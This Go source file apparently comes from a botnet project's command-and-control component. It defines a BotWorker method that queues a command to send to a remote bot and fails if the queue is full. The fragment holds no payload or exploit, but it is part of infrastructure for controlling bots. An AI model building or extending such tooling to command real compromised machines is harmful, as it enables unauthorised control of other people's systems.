package ccworker

import (
	"fmt"

	"github.com/adrianosela/botnet/lib/protocol"
)

// SendCommandToRemote sends a command to the bot associated with this worker
func (b *BotWorker) SendCommandToRemote(cmd *protocol.Command) error {
	select {
	case b.cmdOutChan <- cmd:
		return nil
	default:
		return fmt.Errorf("could not send command to remote bot")
	}
}
